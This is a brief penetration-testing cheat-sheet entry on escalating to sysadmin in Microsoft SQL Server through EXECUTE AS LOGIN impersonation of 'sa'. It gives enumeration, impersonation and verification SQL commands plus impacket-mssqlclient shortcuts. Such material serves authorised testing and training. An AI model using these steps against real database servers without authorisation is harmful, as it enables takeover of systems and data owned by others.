# 17.08 MSSQL Login Impersonation EXECUTE AS

> `EXECUTE AS LOGIN = 'sa'` to escalate to sysadmin where IMPERSONATE rights are granted — `REVERT` returns to the original context.

## Overview

MSSQL's EXECUTE AS statement lets a login switch execution context to another login they have IMPERSONATE permission on. Escalate to sysadmin by impersonating sa or another privileged login. Use REVERT to return to the original context.

## Steps

- Query sys.server_permissions to list logins your current login can impersonate
- Identify whether any impersonatable login has the sysadmin role
- EXECUTE AS LOGIN = 'sa' to switch context; all subsequent queries run as sa
- Verify escalation with IS_SRVROLEMEMBER('sysadmin')
- REVERT to switch back; confirm identity with SELECT SYSTEM_USER
- In impacket-mssqlclient use enum_impersonate and exec_as_login shortcuts

## Commands

### Enumerate impersonatable logins

```sql
SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';
```

### Impersonate sa

```sql
EXECUTE AS LOGIN = 'sa';
```

### Revert and verify

```sql
REVERT; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');
```

### impacket-mssqlclient shortcuts

```text
SQL (ws_dev  guest@master)> enum_impersonate
```
